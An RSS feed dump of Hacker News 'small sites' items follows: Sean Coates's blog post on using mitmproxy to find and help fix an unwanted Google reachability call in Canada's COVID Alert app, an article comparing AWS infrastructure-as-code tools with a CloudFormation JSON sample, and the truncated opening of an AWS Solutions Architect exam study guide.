August 24, 2020 | https://seancoates.com/blogs/how-i-helped-fix-canadas-covid-alert-app | <a href="https://web.archive.org/web/*/https://seancoates.com/blogs/how-i-helped-fix-canadas-covid-alert-app">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody text">
    <div>
<p><a href="https://pm.gc.ca/en/news/news-releases/2020/07/31/new-mobile-app-help-notify-canadians-potential-covid-19-exposure-now">On July 31st</a>, Canada's <a href="https://www.canada.ca/en/public-health/services/diseases/coronavirus-disease-covid-19/covid-alert.html">COVID Alert</a> app was made available for general use, though it does not have support for actually <em>reporting</em> a diagnosis in most provinces, yet.</p>
<p>In Quebec, we can run the tracing part of the app, and if diagnosis codes become available here, the app can retroactively report contact. It uses the tracing mechanism that <a href="https://covid19.apple.com/contacttracing">Google and Apple created together</a>, and in my opinion—at least for now—Canadians should be running this thing to help us all deal with COVID-19. I won't run it forever, but for now, it seems to me that the benefits outweigh the "government can track me" fear (it's not actually tracking you; it doesn't even know who you are), and it's enabled on my phone.</p>
<p>But, before I decided to take this position and offer up my own movement data, I wanted to be sure the app is doing what it says it's doing—at least to the extent of my abilities to be duly diligent. (Note: it's not purely <em>movement</em> data that's shared—at least without more context—but it's actual physical interactions with other people whose phones are available within the radio range of Bluetooth LE.)</p>
<p>Before installing the app on my real daily-carry phone, I decided to put it on an old phone I still have, and to do some analysis on the most basic level of communication: who is it contacting?</p>
<p>In 2015, I gave a <a href="https://prezi.com/iqwzy66rn3uo/inspect-https-with-your-own-man-in-the-middle-non-attacks/">talk</a> at <a href="https://confoo.ca/en">ConFoo</a> entitled "<em>Inspect HTTP(S) with Your Own Man-in-the-Middle Non-Attacks</em>", and this is exactly what I wanted to do here. The tooling has improved in the past 5 years, and firing up <em>mitmproxy</em>, even without ever having used it on this relatively new laptop, was a one-liner, thanks to <a href="https://nixos.org/learn.html">Nix</a>:</p>
<pre><span>nix-shell -p mitmproxy --run mitmproxy</span>
</pre>

<p>This gave me a terminal-based UI and proxy server that I pointed my old phone at (via the Wifi Network settings, under HTTP proxy, pointed to my laptop's local IP address). I needed to have mitmproxy create a Certificate Authority that it could use to generate and sign "trusted" certificates, and then have my phone trust that authority, by visiting <code>http://mitm.it/</code> in mobile Safari, and doing the certificate acceptance dance (this is even more complicated on the latest versions of iOS). Worth noting also, is that certain endpoints such as the Apple App Store appear to use <a href="https://en.wikipedia.org/wiki/HTTP_Public_Key_Pinning">Certificate Pinning</a>, so you'll want to do things like install the COVID Alert app from the App Store before turning on the proxy.</p>
<p>Once I was all set up to intercept my own traffic, I visited some <code>https://</code> URLs and saw the request flows in mitmproxy.</p>
<p>I fired up the COVID Alert app again, and noticed something strange… something disturbing:</p>
<p><img src="https://files.scoat.es/covid-tracker-traffic.png" title="COVID Alert app traffic in mitmproxy" alt="shows that the app is accessing clients.google.com"></p>
<p>In addition to the expected traffic to <code>canada.ca</code> (I noticed it's using <code>.alpha.canada.ca</code>, but I suspect that's due to the often-reported unbearably-long bureaucratic hassle in getting a <code>.canada.ca</code> TLS certificate, but that's another story), my phone, when running COVID Alert, was contacting Google.</p>
<pre><span>HEAD https://clients4.google.com/generate_204</span>
</pre>

<p>A little web searching helped me discover that this is a commonly-used endpoint that helps developers determine if the device is behind a "captive portal" (an interaction that requires log-in or payment, or at least acceptance of terms before granting wider access to the Web). I decided that this was <em>probably</em> unintended by the developers of COVID Alert, but it still bothered me that an app, designed for <em>tracking interactions between people['s devices]</em>, that the <em>government</em> wants us to run is telling Google that I'm running it, and disclosing my IP address in doing so:</p>
<p><img src="https://files.scoat.es/covid-alert-google.png" title="A request to clients.google.com, from the COVID Alert app" alt="shows that the User Agent header identifies the app as " covid="" alert="" version=""></p>
<p>(Note that the app clearly identifies itself in the <code>User-Agent</code> header.) </p>
<p>A bit more quick research turned up a <a href="https://www.priv.gc.ca/en/privacy-topics/privacy-laws-in-canada/the-personal-information-protection-and-electronic-documents-act-pipeda/pipeda-compliance-help/pipeda-interpretation-bulletins/interpretations_02/#fn50-rf">statement by Canada's Privacy Commissioner</a>:</p>
<blockquote><p>An Internet Protocol (IP) address can be considered personal information if it can be associated with an identifiable individual. For example, in one complaint finding, we determined that some of the IP addresses that an internet service provider (ISP) was collecting were personal information because the ISP had the ability to link the IP addresses to its customers through their subscriber IDs.</p></blockquote>

<p>It's not too difficult to imagine that Google <em>probably</em> has enough data on Canadians for this to be a real problem.</p>
<p>I discovered that this app is maintained by the <a href="https://digital.canada.ca/">Canadian Digital Service</a>, and that the <a href="https://github.com/cds-snc/covid-alert-app">source code is on GitHub</a>, but that the <a href="https://github.com/cds-snc/covid-alert-app/search?q=clients3.google.com&amp;unscoped_q=clients3.google.com&amp;type=Code">code itself didn't directly contain any references to <code>clients3.google.com</code></a>.</p>
<p>It's a <a href="https://reactnative.dev/">React Native</a> app, and I figured that the call out to Google must be in one of the <a href="https://github.com/cds-snc/covid-alert-app/blob/master/package.json">dependencies</a>, which—considering the norm with JavaScript apps—are pleasantly restrained mostly to React itself. I had no idea which of these libraries was calling out to Google.</p>
<p>Now, I could have run this app on the iOS Simulator (which did I end up doing to test my patches, below), but I thought "let's see what my <em>actual</em> phone is doing." I threw caution to the wind, and I ran <a href="https://checkra.in/">checkra1n</a> on my <em>old</em> phone, which gave me ssh access, which in turn allowed me to copy the app's application bundle to my laptop, where I could do a little more analysis (note the app is bundled as <em>CovidShield</em> because it was previously <a href="https://www.covidshield.app/">developed by volunteers at Shopify</a> and was then renamed by CDS (or so I gather, anyway)).</p>
<pre><span>~/De/C/iphone/CovidShield.app ▶ grep -r 'clients3.google.com' *</span>
<span>main.jsbundle:__d(function(g,r,i,a,m,e,d){Object.defineProperty(e,"__esModule",{value:!0}),</span>
<span>e.default=void 0;var t={reachabilityUrl:'https://clients3.google.com/generate_204',</span>
<span>reachabilityTest:function(t){return Promise.resolve(204===t.status)},reachabilityShortTimeout:5e3,</span>
<span>reachabilityLongTimeout:6e4,reachabilityRequestTimeout:15e3};e.default=t},708,[]);</span>
</pre>

<p>(Line breaks added for legibility.) Note <code>reachabilityUrl:'https://clients3.google.com/generate_204</code>. Found it! A bit more searching led me to a package called <code>react-native-netinfo</code> (which was directly in the above-linked <code>package.json</code>), and its <a href="https://github.com/react-native-community/react-native-netinfo/blob/4e3e9813fbae89013bbeee6470b005b6d923e022/src/internal/defaultConfiguration.ts#L2">default configuration</a> that sets the <code>reachabilityUrl</code> to Google.</p>
<p>Now that I knew where it was happening, I could fix it.</p>
<p>To make this work the same way, we needed a reliable <code>204</code> endpoint that the app could hit, and to keep with the expectation that this app should not "leak" data outside of <code>canada.ca</code>, I ended up <a href="https://github.com/cds-snc/covid-alert-server/pull/241">submitting a patch</a> for the <a href="https://github.com/cds-snc/covid-alert-server">server side code</a> that the app calls. (It turns out that this was not necessary after all, but I'm still glad I added this to my report.)</p>
<p>I also <a href="https://github.com/cds-snc/covid-alert-app/issues/1003">patched</a>, and tested the app code itself via the iOS Simulator.</p>
<p>I then submitted a write-up of what was going wrong and why it's bad, to the main app repository, as <a href="https://github.com/cds-snc/covid-alert-app/issues/1003">cds-snc/covid-alert-app issue 1003</a>, and felt pretty good about my COVID Civic Duty of the day.</p>
<p>The fine folks at the Canadian Digital Service seemed to recognize the problem and agree that it was something that needed to be addressed. A few very professional back-and-forths later (I'll be honest: I barely knew anything about the CDS and I expected some runaround from a government agency like this, and I was pleasantly surprised), we landed on a solution that simply didn't call the reachability URL at all, and they <a href="https://github.com/cds-snc/covid-alert-app/releases">released a version of the app</a> that fixed my issue!</p>
<p><img src="https://files.scoat.es/covid-alert-release.jpg" title="COVID Alert release notes showing my fix" alt=""></p>
<p>With the new version loaded, I once again checked the traffic and can confirm that the new version of the app does not reach out to anywhere but <code>.canada.ca</code>.</p>
<p><img src="https://files.scoat.es/covid-alert-no-google.png" alt="A mitmproxy flow showing traffic to canada.ca and not google.com"></p>
</div>
    </div></div>]]>
            </description>
            <link>https://seancoates.com/blogs/how-i-helped-fix-canadas-covid-alert-app</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262236</guid>
            <pubDate>Mon, 24 Aug 2020 16:29:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cloudformation, Terraform, or CDK? A Guide to IaC on AWS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262221">thread link</a>) | @forrestbrazeal
<br/>
August 24, 2020 | https://acloudguru.com/blog/engineering/cloudformation-terraform-or-cdk-guide-to-iac-on-aws | <a href="https://web.archive.org/web/*/https://acloudguru.com/blog/engineering/cloudformation-terraform-or-cdk-guide-to-iac-on-aws">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="8a920a5" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			
<p>I’ve been working with Amazon Web Services for 6 years or so, and though the cloud has changed a lot in that time, one thing has remained consistent: <strong>Infrastructure as Code (IaC) is a core pillar of a healthy implementation of AWS.</strong></p>



<p>For anything bigger than a toy cloud application, IaC is table stakes. You’d be hard-pressed to find someone managing anything of scale who thinks letting folks point and click in the console is the optimal route.</p>



<figure></figure>



<p>These days, I actually find it faster to just start with all of my applications or even proof-of-concept with an IaC tool and go from there. I, time and time again, have found it easier to return to projects weeks or months later and quickly be able to understand how things work from a familiar baseline and context. I don’t have to rebuild in my mind exactly what I was thinking from scratch.</p>



<p>The “how” of how one approaches IaC is, of course, AWS engineers’ very own version of the old “tabs vs spaces” debate. </p>



<p>So what IAC tools are available to you in AWS, and how do you choose between them?</p>



<h2>AWS CloudFormation</h2>



<p>CloudFormation (CFN) is the original IaC tool for AWS, released in 2011. I have come to respect, hate, love, and revere its power to describe and manage infrastructure. CFN was originally only offered in JSON, but we were finally treated to a heaping helping of tabs vs spaces actually mattering with <a href="https://www.trek10.com/blog/cloudformation-yaml-and-why-its-awesome">native CFN YAML support in 2016</a>.</p>



<p>CloudFormation is one of the safest ways to build, manage, change, and destroy resources in your infrastructure. It offers robust resource state management, and these days it can tell you what is going to <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/using-cfn-updating-stacks-changesets.html">happen before you run your deployment</a>.</p>



<p>A lot of great features have worked to make CloudFormation more enjoyable or productive to work with over the years.</p>



<h3><strong>CloudFormation Macros &amp; Transforms</strong></h3>



<p>One of the more powerful concepts, bringing whole new capabilities to essentially add your own opinionated capabilities to CloudFormation. For example, Trek10 provides a macro that lets you <a href="https://github.com/trek10inc/sfn-yaml-macro">write Step Function Amazon States Language (ASL) with pure yaml</a> and smartly resolves CFN intrinsic functions.</p>



<p>You could imagine being able to provide opinionated IAM policy generators or S3 bucket resource macros. Whatever you want to do, macros can likely get you there. Take note, while powerful, you are treading dangerous territory as it becomes easy to effectively build your own Domain Specific Language. Instead of CloudFormation managing your resources, you are using CloudFormation as a bad Domain-Specific Language compiler that you have to babysit.</p>



<h3><strong>Resource Providers</strong></h3>



<p>For a while, we only had <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/template-custom-resources.html">Custom Resources</a> to provision and manage resources that CloudFormation didn’t natively support. This is now largely superseded by <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/template-macros.html">Resource Providers</a> which allow you to create private or published providers to bring the management of third party and unsupported resources into your stacks. For example, <a href="https://www.datadoghq.com/blog/monitoring-as-code-with-datadog-and-cloudformation/">Datadog</a>, a popular monitoring tool can be used in your stack to provision and manage your monitoring without needing some out-of-band process.</p>



<div><p><em>In most of my recent work with CFN, I’ve defaulted to using the AWS Serverless Application Model, or <a href="https://aws.amazon.com/serverless/sam/">SAM</a>. SAM is a superset of CFN, with some handy transformations that let you do a bit less typing and wiring up of various resources and permissions. Think of it like a well thought out and “managed” macro. 

If you are doing anything with AWS Lambda or event-driven computing and looking to level up your YAML wrangling, start with SAM.</em></p></div>



<h2>AWS Cloud Development Kit</h2>



<p>AWS Cloud Development Kit (CDK) is the new kid on the block, released in 2019. Using familiar programming languages and provided libraries in TypeScript, Python, Java and .NET developers can write with the same code as the rest of their stack to manage their infrastructure.</p>



<p>CDK, however, is not devoid of CloudFormation. In fact, CDK synthesizes to CloudFormation. You still leverage all the state management and inherent benefits (and downsides) of CloudFormation by adopting CDK.</p>



<p><em>A quick aside: I do want to highlight that some folks view CFN as the “assembly language” of AWS, largely because of how many tools “compile” down to CFN. I think this is a dangerous comparison. It can lead to the interpretation that, like any high-level language to assembly, you don’t really need to understand how the lower-level instruction set works to effectively leverage the higher-level constructs. In my experience, this is patently untrue in the case of CFN. Even a rudimentary understanding of CFN leads to better decisions in the higher level usages like CDK.</em></p>



<p>Ultimately, I would contend that <strong>CDK is the most comfortable and natural entry point for developers to start building Cloud Native applications</strong>.&nbsp;</p>



<h3><strong>Constructs</strong></h3>



<p>One of the particularly powerful features of CDK that I believe CloudFormation has struggled to natively deliver is the idea of truly shareable and reusable modules. CDK has introduced the concept of <a href="https://docs.aws.amazon.com/cdk/latest/guide/constructs.html">constructs</a>. Constructs in practice provide everything from simple wrappings of some specific defaults you would like to re-use across your project all the way to complex multi-resource orchestration and wrapping of <a href="https://docs.aws.amazon.com/cloudformation-cli/latest/userguide/resource-types.html">resource providers</a>. The distribution method for these constructs then relies on the native</p>



<p>The other important part of CDK Constructs is something neat called <a href="https://github.com/aws/jsii">jsii</a>. To quote the project; “jsii allows code in any language to naturally interact with JavaScript classes. It is the technology that enables the AWS Cloud Development Kit to deliver polyglot libraries from a single codebase!” If you write your constructs with TypeScript, it is fairly straight forward to distribute and utilize those constructs across the other core CDK languages – further encouraging sharing of modules.</p>



<p>One of the most elegant ways I can illustrate how nice the CDK experience can be is to put a side-by-side comparison of the usage of <a href="https://docs.aws.amazon.com/step-functions/latest/dg/concepts-amazon-states-language.html">Amazon States Language</a> (ASL). </p>



<p>First what it looks like in CloudFormation Native ASL:</p>



<pre>{
  "DeliveryStepFunctionStateMachine": {
    "Type": "AWS::StepFunctions::StateMachine",
    "Properties": {
      "RoleArn": {
        "Fn::GetAtt": ["DeliveryStepFunctionStateMachineRoleC6479370", "Arn"]
      },
      "DefinitionString": {
        "Fn::Join": [
          "",
          [
            "{\"StartAt\":\"MapperTask\",\"States\":{\"MapperTask\":{\"Next\":\"SetStatusTo-pending\",\"Retry\":[{\"ErrorEquals\":[\"States.ALL\"],\"MaxAttempts\":10}],\"Parameters\":{\"FunctionName\":\"",
            {
              "Ref": "DeliveryStepFunctionMapper"
            },
            "\",\"Payload.$\":\"$\"},\"OutputPath\":\"$.Payload\",\"Type\":\"Task\",\"Resource\":\"arn:",
            {
              "Ref": "AWS::Partition"
            },
            ":states:::lambda:invoke\"},\"SetStatusTo-pending\":{\"Next\":\"retry seconds\",\"Type\":\"Task\",\"ResultPath\":null,\"Resource\":\"arn:",
            {
              "Ref": "AWS::Partition"
            },
            ":states:::dynamodb:updateItem\",\"Parameters\":{\"Key\":{\"pk\":{\"S.$\":\"$.pk\"},\"sk\":{\"S.$\":\"$.sk\"}},\"TableName\":\"",
            {
              "Ref": "PersistenceDDBTable"
            },
            "\",\"ExpressionAttributeNames\":{\"#status\":\"status\"},\"ExpressionAttributeValues\":{\":status\":{\"S\":\"pending\"}},\"ReturnValues\":\"ALL_NEW\",\"UpdateExpression\":\"SET #status = :status\"}},\"retry seconds\":{\"Type\":\"Wait\",\"SecondsPath\":\"$.retrySeconds\",\"Next\":\"SetStatusTo-in-progress\"},\"SetStatusTo-in-progress\":{\"Next\":\"DeliverTransactionTask\",\"Type\":\"Task\",\"ResultPath\":null,\"Resource\":\"arn:",
            {
              "Ref": "AWS::Partition"
            },
            ":states:::dynamodb:updateItem\",\"Parameters\":{\"Key\":{\"pk\":{\"S.$\":\"$.pk\"},\"sk\":{\"S.$\":\"$.sk\"}},\"TableName\":\"",
            {
              "Ref": "PersistenceDDBTable"
            },
            "\",\"ExpressionAttributeNames\":{\"#status\":\"status\"},\"ExpressionAttributeValues\":{\":status\":{\"S\":\"in-progress\"}},\"ReturnValues\":\"ALL_NEW\",\"UpdateExpression\":\"SET #status = :status\"}},\"DeliverTransactionTask\":{\"Next\":\"Delivery success?\",\"Retry\":[{\"ErrorEquals\":[\"States.ALL\"],\"MaxAttempts\":10}],\"Parameters\":{\"FunctionName\":\"",
            {
              "Ref": "DeliveryStepFunctionDeliverTransaction"
            },
            "\",\"Payload.$\":\"$\"},\"OutputPath\":\"$.Payload\",\"Type\":\"Task\",\"Resource\":\"arn:",
            {
              "Ref": "AWS::Partition"
            },
            ":states:::lambda:invoke\"},\"Delivery success?\":{\"Type\":\"Choice\",\"Choices\":[{\"Variable\":\"$.status\",\"StringEquals\":\"complete\",\"Next\":\"SetStatusTo-complete\"},{\"Variable\":\"$.status\",\"StringEquals\":\"failed\",\"Next\":\"SetStatusTo-failed\"}],\"Default\":\"SetStatusTo-pending\"},\"SetStatusTo-complete\":{\"End\":true,\"Type\":\"Task\",\"ResultPath\":null,\"Resource\":\"arn:",
            {
              "Ref": "AWS::Partition"
            },
            ":states:::dynamodb:updateItem\",\"Parameters\":{\"Key\":{\"pk\":{\"S.$\":\"$.pk\"},\"sk\":{\"S.$\":\"$.sk\"}},\"TableName\":\"",
            {
              "Ref": "PersistenceDDBTable"
            },
            "\",\"ExpressionAttributeNames\":{\"#status\":\"status\"},\"ExpressionAttributeValues\":{\":status\":{\"S\":\"complete\"}},\"ReturnValues\":\"ALL_NEW\",\"UpdateExpression\":\"SET #status = :status\"}},\"SetStatusTo-failed\":{\"End\":true,\"Type\":\"Task\",\"ResultPath\":null,\"Resource\":\"arn:",
            {
              "Ref": "AWS::Partition"
            },
            ":states:::dynamodb:updateItem\",\"Parameters\":{\"Key\":{\"pk\":{\"S.$\":\"$.pk\"},\"sk\":{\"S.$\":\"$.sk\"}},\"TableName\":\"",
            {
              "Ref": "PersistenceDDBTable"
            },
            …</pre></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://acloudguru.com/blog/engineering/cloudformation-terraform-or-cdk-guide-to-iac-on-aws">https://acloudguru.com/blog/engineering/cloudformation-terraform-or-cdk-guide-to-iac-on-aws</a></em></p>]]>
            </description>
            <link>https://acloudguru.com/blog/engineering/cloudformation-terraform-or-cdk-guide-to-iac-on-aws</link>
            <guid isPermaLink="false">hacker-news-small-sites-24262221</guid>
            <pubDate>Mon, 24 Aug 2020 16:27:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Pass the AWS Solutions Architect Associate Exam]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24262145">thread link</a>) | @Sandeepg33k
<br/>
August 24, 2020 | https://dannys.cloud/aws-solutions-architect-associate-exam-guide | <a href="https://web.archive.org/web/*/https://dannys.cloud/aws-solutions-architect-associate-exam-guide">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="text"><p>The amount of courses and content that is available to study for one of the most popular exams: AWS Certified Solutions Architect Associate can be overwhelming. <strong>I've created a complete guide that makes sure you can study effectively and pass in one go!</strong></p>
<h2 id="introduction">Introduction</h2>
<p>My goal is to write a guide on every AWS Certified exam that AWS offers. This is my second article on this series and will contain everything you need to know to successfully prepare you for the AWS Solutions Architect Associate exam [SAA-C02].</p>
<p>This guide will contain a bit more acronyms and is somewhat more targeted towards technical people. If you find that you're relatively new to AWS and the technical side of it. I would recommend having a look at the first guide that I wrote on preparing for the <a target="_blank" href="https://dannys.cloud/aws-cloud-practitioner-exam-guide">AWS Cloud Practitioner exam</a></p>
<p>For the <strong>AWS Solutions Architect Associate</strong> exam - complete guide, I've reviewed all the information that's relevant for this course and curated the content to help you get up to speed more efficiently! By following this guide you should get prepared to successfully pass the exam on the first attempt!</p>
<p><strong>Table Of Contents</strong></p>
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#prerequisites">Prerequisites</a></li>
<li><a href="#aws-solutions-architect-associate-exam-overview">AWS Solutions Architect Associate exam overview</a><ul>
<li><a href="#domain-1-design-resilient-architectures-30">Domain 1: Design Resilient Architectures - 30%</a></li>
<li><a href="#domain-2-design-high-performing-architectures-28">Domain 2: Design High-Performing Architectures - 28%</a></li>
<li><a href="#domain-3-design-secure-applications-and-architectures-24">Domain 3: Design Secure Applications and Architectures - 24%</a></li>
<li><a href="#domain-4-design-cost-optimized-architectures-18">Domain 4: Design Cost-Optimized Architectures - 18%</a></li>
</ul>
</li>
<li><a href="#how-to-prepare-for-the-exam">How to prepare for the exam?</a></li>
<li><a href="#technical-preparation-notes">Technical Preparation notes</a><ul>
<li><a href="#domain-1-design-resilient-architectures">Domain 1: Design Resilient Architectures</a><ul>
<li><a href="#ec2-storage-types">EC2 Storage types</a></li>
<li><a href="#amazon-simple-storage-service-s3">Amazon Simple Storage Service (S3)</a></li>
<li><a href="#design-decoupling-systems-using-aws-services">Design decoupling systems using AWS services</a></li>
<li><a href="#elastic-load-balancer-elb">Elastic Load Balancer (ELB)</a></li>
</ul>
</li>
<li><a href="#domain-2-design-high-performing-architectures">Domain 2: Design High-Performing Architectures</a><ul>
<li><a href="#amazon-rds">Amazon RDS</a></li>
<li><a href="#dynamodb">DynamoDB</a></li>
<li><a href="#elasticache">Elasticache</a></li>
<li><a href="#cloudfront">CloudFront</a></li>
</ul>
</li>
<li><a href="#domain-3-design-secure-applications-and-architectures">Domain 3: Design Secure Applications and Architectures</a><ul>
<li><a href="#shared-responsibility-model">Shared responsibility model</a></li>
<li><a href="#aws-identity-and-access-management-iam">AWS Identity and Access Management (IAM)</a></li>
<li><a href="#aws-key-management-service">AWS Key Management Service</a></li>
<li><a href="#aws-cloudhsm">AWS CloudHSM</a></li>
<li><a href="#aws-vpc">AWS VPC</a></li>
</ul>
</li>
<li><a href="#domain-4-design-cost-optimized-architectures">Domain 4: Design Cost-Optimized Architectures</a></li>
</ul>
</li>
<li><a href="#practice-exam-questions">Practice exam questions</a><ul>
<li><a href="#practice-question-1">Practice question #1</a></li>
<li><a href="#practice-question-2">Practice question #2</a></li>
<li><a href="#practice-question-3">Practice question #3</a></li>
<li><a href="#practice-question-4">Practice question #4</a></li>
<li><a href="#practice-question-5">Practice question #5</a></li>
<li><a href="#practice-question-6">Practice question #6</a></li>
<li><a href="#practice-question-7">Practice question #7</a></li>
</ul>
</li>
<li><a href="#aws-certified-solutions-architect-associate-study-material">AWS Certified Solutions Architect Associate Study material</a><ul>
<li><a href="#reading-material">Reading material</a></li>
<li><a href="#video-material">Video material</a></li>
</ul>
</li>
<li><a href="#you-should-now-be-fully-prepared-for-the-aws-certified-solutions-architect-associate-exam">You should now be fully prepared for the AWS Certified Solutions Architect Associate exam!</a></li>
<li><a href="#aws-certified-solutions-architect-associate-exam--faq">AWS Certified Solutions Architect Associate exam – FAQ</a><ul>
<li><a href="#is-the-aws-certified-solutions-architect-associate-exam-easy">Is the AWS Certified Solutions Architect Associate exam easy?</a></li>
<li><a href="#how-long-does-it-take-to-prepare-for-the-aws-certified-solutions-architect-associate-certification">How long does it take to prepare for the AWS Certified Solutions Architect Associate certification?</a></li>
<li><a href="#im-ready-to-do-the-aws-certified-solutions-architect-associate-exam-how-do-i-schedule-it">I’m ready to do the AWS Certified Solutions Architect Associate exam, how do I schedule it?</a></li>
</ul>
</li>
</ul>
<h2 id="prerequisites">Prerequisites</h2>
<p>This exam is intended for people who have one or more years of hands-on experience designing available,
  cost-efficient, fault-tolerant, and scalable distributed systems on AWS. You're required to be familiar with the AWS
  terminology and with the most common used AWS Services</p>
<p>If you want to start practicing with these AWS Services, it is important to create a <a target="_blank" href="https://portal.aws.amazon.com/billing/signup#/start">free AWS account</a> first. AWS offers a <a target="_blank" href="http://aws.amazon.com/free">free tier</a> to get familiar with its services without expenses so you can
  experiment with the exercises that are provided in this guide.</p>
<p>AWS recommends you to have the following experience and knowledge before attending the exam:</p>
<blockquote>
<ul>
<li>Hands-on experience using compute, networking, storage, and database AWS services</li>
<li>Hands-on experience with AWS deployment and management services</li>
<li>Ability to identify and define technical requirements for an AWS-based application</li>
<li>Ability to identify which AWS services meet a given technical requirement</li>
<li>Knowledge of recommended best practices for building secure and reliable applications on the AWS platform</li>
<li>An understanding of the basic architectural principles of building on the AWS Cloud</li>
<li>An understanding of security features and tools that AWS provides and how they relate to traditional services</li>
</ul>
<p><a target="_blank" href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">AWS Certified Solutions Architect Associate certification page</a></p>
</blockquote>
<h2 id="aws-solutions-architect-associate-exam-overview">AWS Solutions Architect Associate exam overview</h2>
<p>Some <a target="_blank" href="https://aws.amazon.com/certification/certified-solutions-architect-associate/">practical information</a> that is interesting to know when you plan to schedule the exam:</p>
<ul>
<li>The AWS Solutions Architect Associate exam consists of 65 multiple-choice, multiple-answer questions.</li>
<li>You have 130 minutes to complete the exam.</li>
<li>The exam costs $150,-</li>
<li>The official practice exam costs $20</li>
<li>The minimum passing score for this exam is 720 points</li>
<li>The exam is available in English, Japanese, Korean, and Simplified Chinese.</li>
</ul>
<p>As explained in the official <a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">AWS Certified Solutions Architect exam guide</a>. It covers the following topics including their weighted percentage:</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1597867470378/5orOtiSu2.jpeg?auto=format&amp;q=60" alt="AWS Solutions Architect content outline domains"></p><p>
AWS Solutions Architect content outline domains

</p><h3 id="domain-1-design-resilient-architectures-30">Domain 1: <strong>Design Resilient Architectures - 30%</strong></h3>
<blockquote>
<p>1.1 Design a multi-tier architecture solution
1.2 Design highly available and/or fault-tolerant architectures
1.3 Design decoupling mechanisms using AWS services
1.4 Choose appropriate resilient storage</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>The first domain requires you to understand how to build effective architectures using fundamental AWS services like EC2, VPC, RDS, S3, etc. Best practices are important to know when building these architectures, so it's good to understand the <a target="_blank" href="https://aws.amazon.com/architecture/well-architected/">AWS Well-Architected Framework</a>.</p>
<h3 id="domain-2-design-high-performing-architectures-28">Domain 2: <strong>Design High-Performing Architectures - 28%</strong></h3>
<blockquote>
<p>2.1 Identify elastic and scalable compute solutions for a workload
2.2 Select high-performing and scalable storage solutions for a workload
2.3 Select high-performing networking solutions for a workload
2.4 Choose high-performing database solutions for a workload</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>The focus in this domain lies on building resilient architectures that make use of Scalability and Elasticity. You need to be able to understand the purpose of implementing Multi-AZ and Auto-Scaling to drive costs down and improve fault tolerance.</p>
<h3 id="domain-3-design-secure-applications-and-architectures-24">Domain 3: <strong>Design Secure Applications and Architectures - 24%</strong></h3>
<blockquote>
<p>3.1 Design secure access to AWS resources
3.2 Design secure application tiers
3.3 Select appropriate data security options</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>For the third domain, you're required to understand how to add security measures on four different levels: AWS
  resources, network-, application- and data-layer. The data layer can be distinguished in two parts, data in transit
  and data at rest. For data-security encryption plays a primary role and for networking it's important to know access
  controls like Security groups, ACLs, etc.</p>
<h3 id="domain-4-design-cost-optimized-architectures-18">Domain 4: <strong>Design Cost-Optimized Architectures - 18%</strong></h3>
<blockquote>
<p>4.1 Identify cost-effective storage solutions
4.2 Identify cost-effective compute and database services
4.3 Design cost-optimized network architectures</p>
<p><a target="_blank" href="https://d1.awsstatic.com/training-and-certification/docs-sa-assoc/AWS-Certified-Solutions-Architect-Associate_Exam-Guide.pdf">(SAA-C02) Exam Guide</a></p>
</blockquote>
<p>In the last domain, you need to know how to build cost-efficient architectures with scalability and resiliency taken
  into consideration. You'll also need to know how to select the right type of any resource to effectively do the task
  at hand. And at last, it's important to know how to optimize your network design to transfer data the most efficiently
  from on-premise to the Cloud.</p>
<h2 id="how-to-prepare-for-the-exam">How to prepare for the exam?</h2>
<p>In this section I've bundled up some notes which can be of use when preparing for the AWS Solutions Architect Associates exam. Prior to this Blogpost, I've also released a guide for the <a target="_blank" href="https://dannys.cloud/aws-cloud-practitioner-exam-guide/#technical-preparation-notes">AWS Cloud Practitioner exam technical preparation notes</a>. This contains the foundational information which also helps for this exam, so I highly recommend to read the notes from there as well.</p>
<p>Moving on to the preparation, I’ve written some technical notes which highlight import details which are worth remembering. Next to that, I’ll be sharing seven practice questions that give a good indication of what to expect on the real exam. At last, I’ll be sharing my AWS Solutions Architect learning material list which contains a curated collection of high-quality content to help you study efficiently.</p>
<p>The learning material is divided in two parts:</p>
<ul>
<li>Reading material</li>
<li>Visual material</li>
</ul>
<p>For the readers I'll be sharing my recommended books to read. For the visual learners I'll provided the videos that will help you prepare for the exam.</p>
<h2 id="technical-preparation-notes">Technical Preparation notes</h2>
<p>The technical notes are a bundled package of dense information that helps you get insight in what technical services and details are being treated at the exams. I've divided it into the domains that you'll see at the exam.</p>
<h3 id="domain-1-design-resilient-architectures">Domain 1: Design Resilient Architectures</h3>
<h4 id="ec2-storage-types">EC2 Storage types</h4>
<ul>
<li>Amazon Elastic Block Store (Amazon EBS) provides block level storage volumes for use with Amazon EC2 instances. Three flavors: Magnetic, General purpose SSD, provisioned IOPS SSD. Snapshots can be created and are saved in S3.</li>
